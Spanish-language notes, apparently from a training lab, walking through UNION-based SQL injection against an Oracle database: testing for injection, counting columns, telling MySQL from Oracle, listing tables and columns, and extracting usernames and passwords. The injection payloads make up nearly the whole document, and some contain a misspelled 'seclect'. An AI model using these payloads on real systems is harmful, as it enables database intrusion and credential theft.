Verificar que es susebtible a SQL Injection despues del parametro en la query ponemos ' -- -

Enjemplo
```
categoria=tintes' -- -
```

Verificar cantidad de columnas que devuelve la query
```
categoria=tintes' order by 3-- -

Si devuelve error seguimos probando hasta que coincida y de respuesta positiva una ves conocido el numero 
```

Pasamos a identificar si es de oracle 
```
categoria=tintes' union seclect 1,1-- -              MYSQL
categoria=tintes' union seclect 'test','test''-- -   MYSQL
categoria=tintes' union seclect NULL,NULL-- -        MYSQL

categoria=tintes' union seclect NULL,NULL from dual-- -   ORACLE
```

Pasamos a la enumeración de las tablas de la BD , por que no enumeramos las BD porque oracle no tiene el concepto de multiples db en una instancia si no que una instancia tiene una uncia BD
```
category='union select NULL,table_name FROM all_tables--
```

Enumerar los nombres de las columnas de la tabla
```
'union select NULL,column_name FROM all_tab_columns WHERE table_name ='USERS_XWTOIS'--
```

Obtener los datos de estas columnas
```
'union select USERNAME_MNTVXG,PASSWORD_JISNXD FROM USERS_XWTOIS--
```

Concatenendo en un campo

```
'union select NULL,USERNAME_MNTVXG|| ' : ' ||PASSWORD_JISNXD FROM USERS_XWTOIS--
```